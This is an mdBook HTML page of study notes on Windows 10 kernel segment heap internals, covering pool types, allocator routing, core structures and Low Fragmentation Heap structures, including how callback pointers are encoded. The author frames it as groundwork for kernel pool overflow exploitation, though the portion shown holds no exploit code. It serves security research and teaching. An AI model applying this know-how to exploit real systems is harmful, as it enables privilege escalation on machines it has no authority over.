@@ -1,0 +1,1663 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Windows Kernel Segment Heap Notes</title>
+        <meta name="robots" content="noindex">
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon-de23e50b.svg">
+        <link rel="shortcut icon" href="favicon-8114d1fc.png">
+        <link rel="stylesheet" href="css/variables-8adf115d.css">
+        <link rel="stylesheet" href="css/general-e96d0476.css">
+        <link rel="stylesheet" href="css/chrome-d279d366.css">
+        <link rel="stylesheet" href="css/print-9e4910d8.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="fonts/fonts-9644e21d.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="mdbook-highlight-css" href="highlight-493f70e1.css">
+        <link rel="stylesheet" id="mdbook-tomorrow-night-css" href="tomorrow-night-4c0ae647.css">
+        <link rel="stylesheet" id="mdbook-ayu-highlight-css" href="ayu-highlight-3fdfc3ac.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="src/theme/diagram-themes-611c4066.css">
+        <link rel="stylesheet" href="src/theme/reading-meta-8b54fc46.css">
+        <link rel="stylesheet" href="src/theme/socials-d6097aa1.css">
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "searchindex-d27ad937.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="toc-33747fb4.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="mdbook-body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="mdbook-sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("mdbook-sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="mdbook-sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
+            </noscript>
+            <div id="mdbook-sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="mdbook-page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="mdbook-menu-bar-hover-placeholder"></div>
+                <div id="mdbook-menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="mdbook-sidebar-toggle" class="icon-button" for="mdbook-sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="mdbook-sidebar">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M0 96C0 78.3 14.3 64 32 64H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32C14.3 128 0 113.7 0 96zM0 256c0-17.7 14.3-32 32-32H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32zM448 416c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32H416c17.7 0 32 14.3 32 32z"/></svg></span>
+                        </label>
+                        <button id="mdbook-theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="mdbook-theme-list">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M371.3 367.1c27.3-3.9 51.9-19.4 67.2-42.9L600.2 74.1c12.6-19.5 9.4-45.3-7.6-61.2S549.7-4.4 531.1 9.6L294.4 187.2c-24 18-38.2 46.1-38.4 76.1L371.3 367.1zm-19.6 25.4l-116-104.4C175.9 290.3 128 339.6 128 400c0 3.9 .2 7.8 .6 11.6c1.8 17.5-10.2 36.4-27.8 36.4H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H240c61.9 0 112-50.1 112-112c0-2.5-.1-5-.2-7.5z"/></svg></span>
+                        </button>
+                        <ul id="mdbook-theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-ayu">Ayu</button></li>
+                        </ul>
+                        <button id="mdbook-search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="mdbook-searchbar">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352c79.5 0 144-64.5 144-144s-64.5-144-144-144S64 128.5 64 208s64.5 144 144 144z"/></svg></span>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Windows Kernel Segment Heap Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <span class=fa-svg id="print-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M128 0C92.7 0 64 28.7 64 64v96h64V64H354.7L384 93.3V160h64V93.3c0-17-6.7-33.3-18.7-45.3L400 18.7C388 6.7 371.7 0 354.7 0H128zM384 352v32 64H128V384 368 352H384zm64 32h32c17.7 0 32-14.3 32-32V256c0-35.3-28.7-64-64-64H64c-35.3 0-64 28.7-64 64v96c0 17.7 14.3 32 32 32H64v64c0 35.3 28.7 64 64 64H384c35.3 0 64-28.7 64-64V384zm-16-88c-13.3 0-24-10.7-24-24s10.7-24 24-24s24 10.7 24 24s-10.7 24-24 24z"/></svg></span>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="mdbook-search-wrapper" class="hidden">
+                    <form id="mdbook-searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="mdbook-searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="mdbook-searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <span class=fa-svg id="fa-spin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M304 48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zm0 416c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM48 304c26.5 0 48-21.5 48-48s-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48zm464-48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM142.9 437c18.7-18.7 18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zm0-294.2c18.7-18.7 18.7-49.1 0-67.9S93.7 56.2 75 75s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zM369.1 437c18.7 18.7 49.1 18.7 67.9 0s18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9z"/></svg></span>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="mdbook-searchresults-outer" class="searchresults-outer hidden">
+                        <div id="mdbook-searchresults-header" class="searchresults-header"></div>
+                        <ul id="mdbook-searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('mdbook-sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('mdbook-sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#mdbook-sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="mdbook-content" class="content">
+                    <main>
+                        <h1 id="windows-kernel-segment-heap-notes"><a class="header" href="#windows-kernel-segment-heap-notes">Windows Kernel Segment Heap Notes</a></h1>
+<p>There is a lot to digest when it comes to windows kernel segment heap and the best way for me was to make my own diagrams and notes to understand it. I took the help from the following references. There are plenty of great resources on heap memory in Linux, but finding a single, comprehensive resource for Windows is much harder. A lot of the information is scattered across research papers, blog posts, conference talks and other sources, so I thought I’d put what I’ve learned together and share it with you all. It also gives me something I can come back to and use as a reference later on. These notes cover pool types, different allocators like LFH, VS, the backend segment allocator, large blocks and at last, some exploitation techniques for kernel pool overflows using named pipes.</p>
+<p>I’ve tried my best to make this book self-explanatory, enough to understand how the segment heap works and just enough to learn how to exploit it. If something still doesn’t make sense, you can take help from the links below.</p>
+<p>Everything here targets Windows 10 20H2. If you find something incorrect or any useful information missing, please let me know :)</p>
+<p class="author-line">
+  <em>- mrT4ntr4</em>
+  <span class="social-icons">
+  <a href="https://github.com/mrT4ntr4" target="_blank" rel="noopener" title="GitHub"><svg viewbox="0 0 16 16" aria-hidden="true"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z" /></svg></a>
+  <a href="https://x.com/MrT4ntr4" target="_blank" rel="noopener" title="Twitter/X"><svg viewbox="0 0 24 24" aria-hidden="true"><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" /></svg></a>
+  <a href="https://www.linkedin.com/in/malhotrasuraj/" target="_blank" rel="noopener" title="LinkedIn"><svg viewbox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" /></svg></a>
+  </span>
+</p>
+
+<h3 id="references"><a class="header" href="#references">References</a></h3>
+<ul>
+<li><a href="https://speakerdeck.com/scwuaptx/windows-kernel-heap-segment-heap-in-windows-kernel-part-1">Segment Heap in Windows Kernel (Part 1)</a> (angelboy)</li>
+<li><a href="https://blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf">Windows 10 Segment Heap Internals</a> (Yason)</li>
+<li><a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">Scoop the Windows 10 Pool</a> (Bayet, Fariello)</li>
+<li><a href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation">Windows Non-Paged Pool Overflow Exploitation</a> (vp777)</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="windows-kernel-pool"><a class="header" href="#windows-kernel-pool">Windows Kernel Pool</a></h1>
+<p class="reading-meta">436 words · 2 minutes</p>
+
+<p>The kernel pool is allocator-managed memory used by kernel components and drivers for dynamic memory allocations. Before Windows 10 19H1, kernel pool allocations used the legacy NT pool allocator. From 19H1 onward, the kernel pool allocation path uses the segment heap based allocator.</p>
+<h2 id="pool-types"><a class="header" href="#pool-types">Pool Types</a></h2>
+<p>Mainly two types for our usecase :</p>
+<ul>
+<li><strong>Paged pool</strong>: memory that can be paged out and is used for data that doesn’t need to stay in physical RAM. It may only be touched below <code>DISPATCH_LEVEL</code>.</li>
+<li><strong>Nonpaged pool</strong>: Memory that is never paged out and stays resident in RAM. It can be read at any IRQL. It is mostly used for data accessed by code that cannot tolerate page faults</li>
+</ul>
+<p>The <code>PoolType</code> argument of <code>ExAllocatePoolWithTag</code> includes more information:</p>
+<ul>
+<li>bit 0: <code>Paged</code> vs NonPagedPool allocation</li>
+<li>bit 1: <code>MustSucceed</code> If the allocation fails, the kernel bugchecks instead of returning <code>NULL</code>.</li>
+<li>bit 2: <code>CacheAligned</code> Returns a cache-line-aligned pointer (see <a href="#pool-header">Pool Header</a>).</li>
+<li>bit 3: <code>PoolQuota</code> Charges the allocation against the requesting process’s pool quota (the amount of kernel pool memory it is allowed to consume). <code>ProcessBilled</code> identifies the process that is charged for the allocation.</li>
+<li>bit 9: <code>NonPagedPoolNx</code>  allocates from non-executable nonpaged pool.</li>
+</ul>
+<p>Kernel code typically reaches this allocator through APIs such as:</p>
+<pre><code class="language-c">PVOID ExAllocatePoolWithTag(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Tag);
+</code></pre>
+<pre><code class="language-c">VOID ExFreePoolWithTag(PVOID P, ULONG Tag);
+</code></pre>
+<h2 id="allocator-overview"><a class="header" href="#allocator-overview">Allocator Overview</a></h2>
+<span class="theme-diagram diagram-lg">
+  <img class="diagram-light" src="assets/diagrams/light/segment_heap_allocator.svg" alt="Segment heap allocator overview">
+  <img class="diagram-dark" src="assets/diagrams/dark/segment_heap_allocator.svg" alt="Segment heap allocator overview">
+</span>
+<p>The segment heap routes requests by size and allocator state.</p>
+<ul>
+<li><strong>FrontEnd Allocator</strong>
+<ul>
+<li><strong>LFH</strong>: Low Fragmentation Heap allocator.</li>
+<li><strong>VS</strong>: Variable Size allocator.</li>
+</ul>
+</li>
+<li><strong>Backend Allocator</strong>
+<ul>
+<li><strong>Segment allocation</strong>: backend page/block allocator.</li>
+</ul>
+</li>
+<li><strong>Large block allocation</strong>: separate path for very large allocations.</li>
+</ul>
+<p>The NT heap path uses <code>RtlpAllocateHeap</code> / <code>RtlpFreeHeap</code>. The kernel segment heap is very similar to the userland segment heap; only some sizes and configuration differ. These notes focus on <strong>Windows 10 20H2</strong>.</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Size range</th><th>Allocator</th><th>Implementation</th></tr>
+</thead>
+<tbody>
+<tr><td>&lt; 512 B, LFH enabled</td><td>LFH</td><td><code>RtlpHpLfhContextAllocate</code></td></tr>
+<tr><td>512 B – 128 KiB</td><td>VS</td><td><code>RtlpHpVsContextAllocateInternal</code></td></tr>
+<tr><td>128 KiB – ~8 MiB</td><td>Backend segment</td><td><code>RtlpHpSegAlloc</code></td></tr>
+<tr><td>&gt; ~8 MiB</td><td>Large block</td><td><code>RtlpHpLargeAlloc</code></td></tr>
+</tbody>
+</table>
+</div>
+<p>If the frontend allocator does not have enough memory available, it requests memory from the backend.</p>
+<div class="admonition note">
+<p class="admonition-title">Dynamic Lookaside</p>
+
+<p>Allocations in the <code>0x201 &lt; Size &lt; 0xfe0</code> (~512 B to ~4 KB) range are served from a dynamic lookaside list first, before reaching VS. See the [Dynamic Lookaside](06-dynamic-lookaside.md) chapter.</p>
+
+</div>
+
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="core-structures"><a class="header" href="#core-structures">Core Structures</a></h1>
+<p class="reading-meta">411 words · 2 minutes</p>
+
+<h2 id="heap-manager-state"><a class="header" href="#heap-manager-state">Heap Manager State</a></h2>
+<p><code>nt!ExPoolState</code> is the core global state for kernel pool memory allocation. It contains the heap manager and the pool nodes used to reach the actual segment heaps.</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>HeapManager</code></td><td><code>_RTLP_HP_HEAP_MANAGER</code>. Stores global variables and metadata for the kernel pool manager.</td></tr>
+<tr><td><code>NumberOfPool</code></td><td>Number of pool nodes. Default is 1.</td></tr>
+<tr><td><code>PoolNode[64]</code></td><td>Each node is an <code>_EX_HEAP_POOL_NODE</code> and holds four heaps corresponding to different segment heaps (Paged / Nonpaged pool, etc.).</td></tr>
+</tbody>
+</table>
+</div>
+<p>These four segment heaps are created and initialized when the system boots (<code>ExPoolState.PoolNode[0].Heap[0-4]</code>).</p>
+<pre><code class="language-text">ExPoolState.PoolNode[0].Heap[0] -&gt; NonPagedPool
+ExPoolState.PoolNode[0].Heap[1] -&gt; NonPagedPoolNx
+ExPoolState.PoolNode[0].Heap[2] -&gt; PagedPool
+ExPoolState.PoolNode[0].Heap[3] -&gt; PagedPrototype
+</code></pre>
+<h2 id="segment-heap"><a class="header" href="#segment-heap">Segment Heap</a></h2>
+<span class="theme-diagram" width="70%">
+  <img class="diagram-light" src="assets/diagrams/light/segment_heap_structure.svg" alt="Segment heap manager structure">
+  <img class="diagram-dark" src="assets/diagrams/dark/segment_heap_structure.svg" alt="Segment heap manager structure">
+</span>
+<p><code>_SEGMENT_HEAP</code> is the core heap object used for a pool type. Each pool type has its own <code>_SEGMENT_HEAP</code>; when allocating, the pool type decides which heap is used.<br>Some of its members are :</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>EnvHandle</code></td><td><code>RTL_HP_ENV_HANDLE</code>. The environment handle of the segment heap.</td></tr>
+<tr><td><code>Signature</code></td><td>Signature of the segment heap. It is <strong>always</strong> <code>0xddeeddee</code>.</td></tr>
+<tr><td><code>AllocatedBase</code></td><td>Points to the end of the entire <code>_SEGMENT_HEAP</code> structure. Used to allocate the structures required by the LFH allocator (bucket, owner, affinity slot). After allocation it points to the end of the allocated structure. Used in LFH activation (see <a href="#activation-mechanism">LFH - Activation Mechanism</a>).</td></tr>
+<tr><td><code>SegContexts</code></td><td>Two <code>_HEAP_SEG_CONTEXT</code> structures, the core structure of the backend manager, divided by size into two contexts (<code>0x20000 &lt; Size &lt;= 0x7f000</code> and <code>0x7f000 &lt; Size &lt;= 0x7f0000</code>). We’ll talk about this in <a href="#backend-segment-allocation">Backend Segment Allocation</a>.</td></tr>
+<tr><td><code>VsContext</code></td><td><code>_HEAP_VS_CONTEXT</code>. The core structure of the frontend VS allocator. We’ll talk about this in <a href="#variable-size-allocation">Variable Size Allocation</a>.</td></tr>
+<tr><td><code>LfhContext</code></td><td><code>_HEAP_LFH_CONTEXT</code>. The core structure of the frontend LFH allocator. We’ll talk about this in <a href="#low-fragmentation-heap">Low Fragmentation Heap</a>.</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="heap-globals"><a class="header" href="#heap-globals">Heap Globals</a></h2>
+<p><code>nt!RtlpHpHeapGlobals</code> stores keys and global values used by segment heap internals. In the segment heap, many fields, values, and function pointers are encoded; this structure stores the keys used to decode them.</p>
+<pre><code class="language-text">_RTLP_HP_HEAP_GLOBALS
+0x0    HeapKey (8 bytes)
+0x8    LfhKey (8 bytes)
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>HeapKey</code></td><td>Random value used by the VS allocator and the backend (segment) allocator encoding.</td></tr>
+<tr><td><code>LfhKey</code></td><td>Random value used by the LFH allocator encoding.</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="low-fragmentation-heap"><a class="header" href="#low-fragmentation-heap">Low Fragmentation Heap</a></h1>
+<p class="reading-meta">1528 words · 7 minutes</p>
+
+<p>LFH is the frontend allocator for fixed-size blocks. It groups allocations by size class and manages blocks through buckets, affinity slots, and subsegments.</p>
+<h2 id="why-lfh"><a class="header" href="#why-lfh">Why LFH?</a></h2>
+<p>A heap that serves every allocation from one contiguous free space quickly fragments: allocations and frees of many different sizes leave small, scattered gaps that are too small to satisfy larger requests, wasting memory. LFH mitigates this by grouping allocations into <strong>buckets by size</strong>, where every block in a bucket is the same size. A freed block is therefore immediately reusable by the next allocation of the same size, with no splitting or coalescing across sizes.</p>
+<p>That is why it is called a <em>low fragmentation</em> heap: freed slots stay reusable instead of turning the heap into unusable fragments.</p>
+<h2 id="allocation-size"><a class="header" href="#allocation-size">Allocation Size</a></h2>
+<p>LFH applies when <code>Size &lt;= 512 bytes</code> and LFH is enabled for that size (see <a href="#activation-mechanism">Activation Mechanism</a>).</p>
+<h2 id="lfh-structures"><a class="header" href="#lfh-structures">LFH Structures</a></h2>
+<span class="theme-diagram diagram-lg">
+  <img class="diagram-light" src="assets/diagrams/light/lfh_structures.svg" alt="LFH structures">
+  <img class="diagram-dark" src="assets/diagrams/dark/lfh_structures.svg" alt="LFH structures">
+</span>
+<p><code>_HEAP_LFH_CONTEXT</code> is the main LFH allocator state. It tracks the backend context, callback table, configuration, buckets, and related state for managing LFH blocks.</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>BackendCtx</code></td><td>Points to the backend allocator (<code>_HEAP_SEG_CONTEXT</code>) used by LFH.</td></tr>
+<tr><td><code>Callbacks</code></td><td><code>_HEAP_SUBALLOCATOR_CALLBACKS</code>. Callback function table used to allocate / release subsegments: <code>Allocate</code>, <code>Free</code>, <code>Commit</code>, <code>Decommit</code>, <code>ExtendContext</code>. The function pointers are encoded (see below).</td></tr>
+<tr><td><code>Config</code></td><td><code>_RTL_HP_LFH_CONFIG</code>. Attributes of the LFH allocator; used to determine whether the allocation size is within the LFH scope. (see <a href="#lfh-config">LFH Config</a>)</td></tr>
+<tr><td><code>Buckets[129]</code></td><td>Bucket array. Each bucket corresponds to blocks in a specific size range. When LFH is enabled it points to a <code>_HEAP_LFH_BUCKET</code> (see <a href="#lfh-bucket">LFH Bucket</a>), otherwise the entry stores the allocation counter described in Activation.</td></tr>
+</tbody>
+</table>
+</div>
+<div class="admonition warn">
+<p class="admonition-title">Encoding</p>
+
+<p><strong>EncodedCallback</strong> = <code>FunctionPointer ^ RtlpHpHeapGlobals.HeapKey ^ LfhContext</code></p>
+
+</div>
+
+<h3 id="lfh-config"><a class="header" href="#lfh-config">LFH Config</a></h3>
+<p><code>_RTL_HP_LFH_CONFIG</code> describes the attributes of the LFH allocator:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>MaxBlockSize</code></td><td>The size of the max block in LFH.</td></tr>
+<tr><td><code>WitholdPageCrossingBlocks</code></td><td>Whether there are any cross-page blocks.</td></tr>
+<tr><td><code>DisableRandomization</code></td><td>Whether to disable randomization of LFH.</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="lfh-bucket"><a class="header" href="#lfh-bucket">LFH Bucket</a></h3>
+<p>The bucket and its related structures are allocated only when LFH is enabled. A bucket is a <code>_HEAP_LFH_BUCKET</code>:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>State</code></td><td><code>_HEAP_LFH_SUBSEGMENT_OWNER</code>. Indicates the status of the bucket; used to manage the memory pool of LFH.</td></tr>
+<tr><td><code>TotalBlockCount</code></td><td>Total number of blocks in the bucket.</td></tr>
+<tr><td><code>TotalSubsegmentCount</code></td><td>Total number of subsegments in the bucket.</td></tr>
+<tr><td><code>ReciprocalBlockSize</code></td><td>Reciprocal of the block size (used for fast division).</td></tr>
+<tr><td><code>AffinitySlots[]</code></td><td>Pointer array to <code>_HEAP_LFH_AFFINITY_SLOT</code>. The main structure used to manage the memory pool used by LFH. There is only one by default.</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="affinity-slot"><a class="header" href="#affinity-slot">Affinity Slot</a></h3>
+<p><code>_HEAP_LFH_AFFINITY_SLOT</code> is the main structure used to manage the memory pool used by LFH:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>State</code></td><td>Same structure as <code>State</code> in the LFH bucket, but this one is mainly used to manage subsegments.</td></tr>
+<tr><td><code>ActiveSubsegment</code></td><td><code>_HEAP_LFH_FAST_REF</code>. Points to the subsegment being used. The lowest 12 bits indicate how many blocks are available in the subsegment.</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="subsegment-owner"><a class="header" href="#subsegment-owner">Subsegment Owner</a></h3>
+<p><code>_HEAP_LFH_SUBSEGMENT_OWNER</code> is the state structure used both by buckets and affinity slots:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>IsBuckets</code></td><td>Whether this owner is the bucket (as opposed to an affinity slot).</td></tr>
+<tr><td><code>BucketIndex</code></td><td>The index of the bucket.</td></tr>
+<tr><td><code>AvailableSubsegmentCount</code></td><td>Number of available subsegments.</td></tr>
+<tr><td><code>AvailableSubsegmentList</code></td><td><code>_LIST_ENTRY</code>. Points to the next available subsegment in the bucket.</td></tr>
+<tr><td><code>FullSubsegmentList</code></td><td><code>_LIST_ENTRY</code>. Points to the next used-up subsegment in the bucket.</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="subsegments"><a class="header" href="#subsegments">Subsegments</a></h2>
+<span class="theme-diagram" width="70%">
+  <img class="diagram-light" src="assets/diagrams/light/lfh_subsegment.svg" alt="LFH subsegment layout">
+  <img class="diagram-dark" src="assets/diagrams/dark/lfh_subsegment.svg" alt="LFH subsegment layout">
+</span>
